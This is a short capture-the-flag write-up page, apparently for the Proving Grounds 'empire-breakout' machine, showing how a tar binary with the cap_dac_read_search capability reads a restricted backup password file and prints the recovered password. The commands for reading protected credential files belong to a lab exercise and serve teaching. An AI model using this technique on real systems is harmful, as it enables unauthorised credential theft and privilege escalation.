---
layout: default
title: Tar
parent: Extended Capabilities
nav_order: 1
---

# Tar

---

## Check for Extended Capabilities

```bash
cyber@breakout:~$ getcap -r / 2>/dev/null
/home/cyber/tar cap_dac_read_search=ep
/usr/bin/ping cap_net_raw=ep

```

_Tar_ has cap_dac_read_search capabilities.
This extended capability allows us to read access to anything.
This could be used to read restricted files such as /etc/shadow in order to display password hashes.

When running _linpeas_ we see there is a _/var/backups/.old_pass.bak_ that we can try to read with the _Tar_ binary.

![backup](../../../../assets/images/ctfs/proving_grounds/empire-breakout/backup.png)

```bash
cyber@breakout:~$ ./tar -cvf old_pass /var/backups/.old_pass.bak
./tar: Removing leading `/' from member names
/var/backups/.old_pass.bak
cyber@breakout:~$ ./tar -xvf old_pass
var/backups/.old_pass.bak
cyber@breakout:~$ cat var/backups/.old_pass.bak
Ts&4&YurgtRX(=~h
```
